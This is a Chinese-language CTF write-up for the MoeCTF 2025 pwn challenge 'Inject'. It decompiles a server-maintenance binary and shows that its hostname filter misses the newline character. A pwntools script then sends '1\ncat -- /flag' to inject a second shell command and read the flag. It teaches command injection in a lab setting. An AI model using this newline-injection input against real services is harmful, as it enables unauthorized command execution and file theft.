---
title: '西电CTF MoeCTF 2025 PWN Inject'
date: '2026-09-04T20:41:23+08:00'
lastmod: '2026-09-04T20:41:23+08:00'
summary: ""
hideSummary: true
draft: false
author: "QingKong996"
categories:
  - "CTF"
tags:
  - "CTF"
  - "Pwn"
---

```
本文为人工撰写，仅使用生成式AI校对。
```

[题目链接](https://ctf.xidian.edu.cn/training/22?challenge=962)

依旧是丢到`interactive Disassembler Professional`(IDA Pro)里面。

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+4h] [rbp-2Ch] BYREF
  unsigned __int64 v5; // [rsp+8h] [rbp-28h]

  v5 = __readfsqword(0x28u);
  setbuf(_bss_start, 0LL);
  setbuf(stdin, 0LL);
  puts("Welcome to server maintainance system.");
  while ( 1 )
  {
    _printf_chk(
      1LL,
      "1. List processes\n2. Check disk usage\n3. Check network activity\n4. Test connectivity\n5. Exit\nYour choice: ");
    if ( (int)_isoc99_scanf("%u", &v4) < 0 )
      break;
    getc(stdin);
    switch ( v4 )
    {
      case 1:
        execute("ps aux");
        break;
      case 2:
        execute("df -h");
        break;
      case 3:
        execute("netstat -ant");
        break;
      case 4:
        ping_host();
        break;
      case 5:
        exit(0);
      default:
        puts("Invalid choice!");
        break;
    }
  }
  exit(1);
}
```

注意到`ping_host()`。

```c
unsigned __int64 ping_host()
{
  size_t v0; // rax
  unsigned __int64 result; // rax
  char v2; // [rsp+1h] [rbp-51h]
  __int64 buf[2]; // [rsp+2h] [rbp-50h] BYREF
  char command[40]; // [rsp+12h] [rbp-40h] BYREF
  unsigned __int64 v5; // [rsp+3Ah] [rbp-18h]

  v5 = __readfsqword(0x28u);
  buf[0] = 0LL;
  buf[1] = 0LL;
  _printf_chk(1LL, "Enter host to ping: ");
  if ( read(0, buf, 0xFuLL) <= 0 )
    exit(1);
  v0 = strlen((const char *)buf);
  if ( *(&v2 + v0) == 10 )
    *(&v2 + v0) = 0;
  if ( check((const char *)buf) )
  {
    _snprintf_chk(command, 32LL, 1LL, 32LL, "ping %s -c 4", (const char *)buf);
    execute(command);
  }
  else
  {
    puts("Invalid hostname or IP!");
  }
  result = v5 - __readfsqword(0x28u);
  if ( result )
    _stack_chk_fail();
  return result;
}
```

显然需要我们构造输入来获取flag。

先查看`check()`函数。

```c
_BOOL8 __fastcall check(const char *a1)
{
  return strpbrk(a1, ";&|><$(){}[]'\"`\\!~*") == 0LL;
}
```



所以我们需要构造能够接受-c 4参数的能够读取文件的命令。

首先可以使用`\n`来分割命令。

> 注意到cat -- 能够强制将后面的参数当成文件来读取。

所以构造`1\ncat -- /flag`



pwntools脚本:

```python
from pwn import *
context(arch='amd64', os='linux', log_level='error')

io = connect("127.0.0.1", 49821)

io.sendline(b'4')

io.send(b'1\ncat -- /flag')

io.interactive()
```

输出:

```
Welcome to server maintainance system.
1. List processes
2. Check disk usage
3. Check network activity
4. Test connectivity
5. Exit
Your choice: Enter host to ping: Executing command: ping 1
cat -- /flag -c 4
sh: 1: ping: not found
moectf{THIS_IS_FLAG}
cat: -c: No such file or directory
cat: 4: No such file or directory
Something went wrong.

1. List processes
2. Check disk usage
3. Check network activity
4. Test connectivity
5. Exit
Your choice:
```

